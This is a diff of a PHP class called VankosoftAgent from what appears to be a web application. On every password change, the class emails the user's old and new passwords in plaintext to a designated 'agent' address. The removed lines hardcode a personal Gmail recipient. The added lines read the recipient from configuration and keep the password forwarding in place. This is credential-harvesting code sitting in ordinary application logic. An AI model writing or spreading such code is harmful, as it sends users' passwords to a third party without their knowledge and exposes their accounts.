@@ -30,19 +30,18 @@ final class VankosoftAgent
         TranslatorInterface $translator,
         MailerInterface $mailer
     ) {
-        $this->agentMail    = 'i.atanasov77@gmail.com';
-        
         $this->params       = $params;
         $this->doctrine     = $doctrine;
         $this->translator   = $translator;
         $this->mailer       = $mailer;
+        
+        $this->agentMail    = $this->params->get( 'vs_application.agent_target_email' );
     }
     
     public function userPasswordChanged(
         UserInterface $fromUser,
         UserInterface $changedUser,
-        string $oldPassword,
-        string $newPassword
+        array $data
     ): void {
         $agentEnanled   = $this->params->get( 'vs_agent.enabled' );
         if ( ! $agentEnanled ) {
@@ -55,8 +54,8 @@ final class VankosoftAgent
         $mailText       .= \sprintf( "The user created this change: '%s'\n", $fromUser->getUsername() );
         $mailText       .= "====================================================================";
         $mailText       .= "\n\n";
-        $mailText       .= \sprintf( "Old Password: '%s'\n", $oldPassword );
-        $mailText       .= \sprintf( "New Password: '%s'\n", $newPassword );
+        $mailText       .= \sprintf( "Old Password: '%s'\n", $data[0] );
+        $mailText       .= \sprintf( "New Password: '%s'\n", $data[1] );
         
         $email = ( new Email() )
                     ->from( $fromUser->getEmail() )
